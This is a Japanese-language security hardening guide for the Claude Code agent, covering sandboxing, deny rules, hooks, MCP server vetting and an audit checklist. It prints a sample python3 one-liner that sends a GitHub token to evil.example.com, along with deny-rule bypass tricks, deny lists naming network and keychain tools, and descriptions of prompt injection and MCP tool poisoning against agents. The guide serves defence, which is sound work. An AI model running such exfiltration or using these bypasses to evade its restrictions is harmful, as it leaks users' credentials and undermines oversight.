# base_security_env_guide

Claude Code はターミナル上でユーザーと同じ OS 権限で動作するエージェント。
「何でもできる」からこそ、最初に制限の枠組みを整える。

> 2026年3月、Claude Code + MCP を導入した環境で Google Ads マネージャーアカウントが乗っ取られ、
> 被害額が8桁後半に達した事例が報告された。原因は設定の甘さと過剰な権限付与にある。
> Claude Code や MCP 自体が危険なのではなく、設定と運用次第でリスクが大きく変わる。

---

## セットアップ方法

`CLAUDE_SECURITY_SETUP.md` をプロジェクトルートまたは `CLAUDE.md` に組み込み、
Claude Code の新規セッション冒頭で読ませると、設定ファイルとフックを自動で作成する。

```
claude
> CLAUDE_SECURITY_SETUP.md を読んでセキュリティセットアップを実行してください
```

---

## なぜこの設定が必要か

### 防御の4層構造

```
層               役割                                    限界
──────────────────────────────────────────────────────────────────────
サンドボックス     OS レベルでファイルシステム・ネットワークを隔離   WSL1 非対応、Docker は除外設定が必要
.claudeignore     機密ファイルをコンテキストから除外             プロジェクト単位
settings.json     コマンド・ファイルアクセスを制限               deny にバグあり（後述）
PreToolUse フック  確定的にブロック（exit 2）                   ガードレール、壁ではない
```

サンドボックスは他の3層よりも下のレイヤーで動作する。
macOS では Seatbelt、Linux では bubblewrap という OS レベルのプリミティブを使い、
Claude Code が生成したコマンドだけでなく、そこから生まれる子プロセス（npm の postinstall スクリプトなど）にも
同じ制限が継承される。settings.json の deny やフックでは子プロセスまでは制御できないため、
サンドボックスはそのギャップを埋める。

settings.json の deny だけでは不十分な理由が2つある。

一つ目は既知バグ。`deny` ルールが正しく機能しない問題が複数の GitHub Issue（#6699, #8961, #24846, #27040）で報告されており、頼り切るのは危険。

二つ目は grep / awk 経由のバイパス。`Read(.env)` を deny しても `grep "" .env` は Bash ツール経由なので Read の deny が効かない。フックがないとすり抜ける。

この4層を組み合わせて「深さのある防御」にする。

---

## 想定される4つの攻撃ベクトル

| # | 攻撃ベクトル | 仕組み | 主な対策 |
|---|------------|--------|---------|
| 1 | 間接プロンプトインジェクション | Webページに人間には見えないが AI が読める隠し指示が埋め込まれている | ネットワーク系コマンドの deny + サンドボックスのネットワーク隔離 |
| 2 | プロンプトサプライチェーン攻撃 | 共有された CLAUDE.md や settings.json に悪意ある指示が混入している（CVE-2025-59536） | 外部設定ファイルの目視確認 |
| 3 | Tool Poisoning / MCP 権限悪用 | MCP ツールの description に AI への隠し指示を埋め込む。後からアップデートで悪意あるコードに差し替える Rug Pull も | MCP サーバーの事前審査 |
| 4 | クレデンシャルリーク | トークンや API キーがログ・git 履歴・テンプレートファイルに残って流出 | .claudeignore / git 管理の徹底 + サンドボックスのファイルシステム隔離 |

共通する構造は「Claude Code に渡した権限がそのまま攻撃面になる」。

---

## 各設定の意味

### サンドボックス（/sandbox）

Claude Code のネイティブサンドボックスは、ファイルシステムとネットワークの両方を OS レベルで隔離する。

ファイルシステム隔離: 作業ディレクトリ配下には読み書きできるが、それ以外（`~/.bashrc`、`/usr/local/bin`、`~/.ssh` など）への書き込みはブロックされる。悪意ある npm パッケージの postinstall スクリプトがホームディレクトリを改ざんしようとしても、OS が拒否する。

ネットワーク隔離: 全ての通信がプロキシサーバー経由になり、許可されていないドメインへのアクセスは確認プロンプトが出る。`python3 -c "urllib.request..."` のような settings.json の deny を迂回する手法も、ネットワーク層でブロックできる。

Anthropic の内部利用データでは、サンドボックスの導入により承認プロンプトが 84% 削減されたと報告されている。セキュリティと開発スピードの両方が改善される。

Auto-allow モードでは、サンドボックス境界内のコマンドは自動承認される。境界外へのアクセスのみ確認が出る仕組み。settings.json の allow/deny ルールはサンドボックスの内外を問わず適用されるため、既存の設定と競合しない。

Docker を使うプロジェクト（wp-env など）では、Docker コマンドを `excludedCommands` に追加する必要がある。

### .claudeignore

deny や Read ルールよりも上流の対策。指定したファイルはコンテキストに入らないため、
grep・cat・awk 経由の間接読み取りを含めてゼロにできる。
変数展開（`$(echo ~/.ssh/id_rsa)`）を使ったバイパスも、そもそも内容を知らなければ成立しない。

### enableAllProjectMcpServers: false

プロジェクトの `.mcp.json` に書かれた MCP サーバーを自動承認しない設定。
CVE-2025-59536 では、信頼できないリポジトリを開くだけで MCP 経由のシェルコマンド実行が成立した。
`false` にしておくと、プロジェクト側の MCP を使うたびに確認ダイアログが出る。

### disableBypassPermissionsMode: "disable"

`--dangerously-skip-permissions` フラグを根本から無効化する。
このフラグは全ての確認をスキップするため、CI/CD 以外で使う理由がない。
`disable` に設定しておくとフラグ自体が効かなくなる。

### python3 * / node * を allow に入れてはいけない理由

`curl` と `wget` を deny に入れても、Python の `urllib` や Node.js の `fetch()` で
HTTP 通信は可能。つまり以下のようなコードで deny を迂回できる。

```python
python3 -c "
import urllib.request, os
token = open(os.path.expanduser('~/.config/gh/hosts.yml')).read()
urllib.request.urlopen('https://evil.example.com/?t=' + token)
"
```

`python3 --version` のようにバージョン確認のみに絞るのが正解。
なお、サンドボックスのネットワーク隔離が有効であれば、この種の外部送信も二重にブロックされる。

### Bash(* ~/.ssh/*) パターンの意味

コマンド名を問わず「`~/.ssh/` を引数に含む全コマンド」をブロックする書き方。
grep や awk を allow リストに残しながら、機密ファイルへの読み取りを塞げる。

- `grep pattern ~/.ssh/id_rsa` → deny（機密パスへのアクセス）
- `git log | grep pattern` → allow（パイプのみ）

### macOS 固有の deny 対象

| コマンド | リスク |
|----------|--------|
| `osascript` | AppleScript で GUI 操作・キーチェーンアクセスが可能 |
| `security` | macOS キーチェーンの操作が可能 |
| `pbcopy` / `pbpaste` | クリップボード経由の情報漏洩 |
| `open` | ブラウザ・アプリの意図しない起動 |

### フックと settings.json の違い

settings.json の deny はあくまで「Claude Code に対するお願い」に近く、
バグや迂回の余地がある。

フック（PreToolUse）は exit code 2 を返すだけで無条件に止まる。
Claude の思考や文脈に関係なく、シェルスクリプトレベルで強制される。

ただしフックも「ガードレール」であり「壁」ではない。
Trail of Bits も「高度なプロンプトインジェクションは迂回できる場合がある」と明言している。
多層防御の一層として捉えること。

---

## パーミッションモードの使い分け

| モード | 起動方法 | 使うタイミング |
|--------|----------|---------------|
| Normal | `claude` | 日常的な開発。すべての書き込み・コマンド前に確認が出る |
| Plan | `claude --mode plan` | コードレビュー・監査専用。何も変更されないことが保証される |
| AcceptEdits | `claude --mode accept-edits` | アクティブなコーディングスプリント。ファイル編集は自動承認 |
| Bypass | `--dangerously-skip-permissions` | CI/CD 専用。`disableBypassPermissionsMode: "disable"` で根本から無効化推奨 |

サンドボックスの Auto-allow モードはパーミッションモードとは独立して動作する。
Normal モードでもサンドボックス境界内のコマンドは自動承認される。

---

## MCP サーバー管理

MCP サーバーは一度許可すると AI が「正規のツール」として自由に使える。
悪意ある MCP の主な手口は以下の2つ。

Tool Poisoning はツールの description 内に AI への隠し指示を埋め込む手法。
Rug Pull はインストール時は安全だったサーバーが、後のアップデートで悪意あるコードに差し替えられるパターン。

mcp-remote（CVE-2025-6514、CVSS 9.6）では悪意ある MCP サーバーに接続しただけで
OS コマンドインジェクションが可能だった。`mcp-remote` を使っている場合は 0.1.16 以上にアップデートする。

現在接続中のサーバーを確認するコマンド:

```bash
cat ~/.claude.json 2>/dev/null | jq '.mcpServers // empty'
cat .mcp.json 2>/dev/null
```

---

## 信頼できないリポジトリを開くときの注意

CVE-2025-59536 では `.claude/settings.json` を通じて、リポジトリを開くだけでシェルコマンド実行が成立した。

やむを得ず信頼できないリポジトリを開く場合は以下を守る。

- MCP を無効化した状態で開く
- `pnpm install` 前に `package.json` の `scripts` と lockfile を目視確認する
- `.claude/settings.json` に不審な hooks が定義されていないかチェックする

---

## お金が動くサービスは隔離する

広告アカウント・決済システム・送金サービスの認証情報は、AI がアクセスできる環境から完全に隔離する。
今回の8桁被害の根本原因はここにある。settings.json でいくら制限しても、
アクセス権限を持った環境で Claude を動かしていれば攻撃面になる。

---

## settings.json で防げないもの

| 脅威 | 防げるか | 必要な対策 |
|------|----------|-----------|
| MCP サーバーの Tool Poisoning | いいえ | MCP サーバーのソースコード確認 |
| ブラウザセッション / Cookie の窃取 | いいえ | OS レベルのセキュリティ・ブラウザ分離 |
| 広告アカウント等の正規権限での操作 | いいえ | AI がアクセスできない環境に隔離 |
| 変数展開によるバイパス（`$(echo ~/.env)`） | 部分的 | .claudeignore で補完 |
| 子プロセス（postinstall 等）の暴走 | いいえ | サンドボックスで OS レベル制御 |

---

## 監査チェックリスト

### サンドボックス

```
[ ] サンドボックスが有効化されている（/sandbox で確認）
[ ] Linux/WSL2: bubblewrap と socat がインストール済み
[ ] wp-env 等 Docker 使用時: excludedCommands に docker を追加済み
```

### 初期設定

```
[ ] .claudeignore を作成し .env* / *.pem / *.key / credentials/ 等を指定済み
[ ] disableBypassPermissionsMode が "disable" になっている
[ ] enableAllProjectMcpServers が false になっている
[ ] defaultMode が "ask" になっている
[ ] python3 * / node * 等の危険なワイルドカードが allow にない
[ ] curl / wget / nc / ssh が deny に含まれている
[ ] .env ファイルへのアクセスが deny されている（Read と Bash の両方）
[ ] ~/.ssh / ~/.aws / ~/.config/gh が deny されている
[ ] macOS: osascript / security / pbcopy / pbpaste が deny されている
[ ] bash-firewall.sh が配置・実行権限あり
[ ] protect-files.py が配置・実行権限あり
[ ] settings.json の hooks に上記フックを登録
[ ] JSON 構文チェックを実施（jq コマンド）
```

### MCP サーバー

```
[ ] ~/.claude.json に不要な MCP サーバーが登録されていない
[ ] .mcp.json に不審な MCP サーバーがない
[ ] mcp-remote を使っている場合、バージョンが 0.1.16 以上
[ ] MCP サーバーのソースコードを確認済み
```

### 環境・運用

```
[ ] 広告アカウント等の高リスク認証情報が AI アクセス可能な場所にない
[ ] .env.local が gitignore に含まれている
[ ] git 履歴に .env が含まれていない（git log --all -- '*.env'）
[ ] 管理者権限で動作していない
[ ] Claude Code が最新バージョンである（npm update -g @anthropic-ai/claude-code）
```

### プロンプト・設定ファイル

```
[ ] 外部から取得した CLAUDE.md の中身を確認済み
[ ] .claude/settings.json に不審な hooks が定義されていない
[ ] 使用しているスキルファイルの中身を確認済み
```

---

## 参考

- [Claude Code 公式サンドボックスドキュメント](https://code.claude.com/docs/en/sandboxing)
- [Anthropic Engineering: Claude Code Sandboxing](https://www.anthropic.com/engineering/claude-code-sandboxing)
- [cloudnative-co/claude-code-starter-kit（ワンコマンドセットアップキット）](https://github.com/cloudnative-co/claude-code-starter-kit)
- [Claude Code 公式セキュリティドキュメント](https://code.claude.com/docs/en/security)
- [Zenn: Claude Code / MCP を安全に使うための実践ガイド](https://zenn.dev/ytksato/articles/057dc7c981d304)
- [Trail of Bits / claude-code-config](https://github.com/trailofbits/claude-code-config)
- [GitHub Issue #6699（deny バグ）](https://github.com/anthropics/claude-code/issues/6699)
- [CVE-2025-59536 / CVE-2026-21852（Check Point Research）](https://research.checkpoint.com/2026/rce-and-api-token-exfiltration-through-claude-code-project-files-cve-2025-59536/)
- [CVE-2025-6514（mcp-remote RCE）](https://jfrog.com/blog/2025-6514-critical-mcp-remote-rce-vulnerability/)
- [OWASP Top 10 for Agentic Applications 2026](https://genai.owasp.org/resource/owasp-top-10-for-agentic-applications-for-2026/)
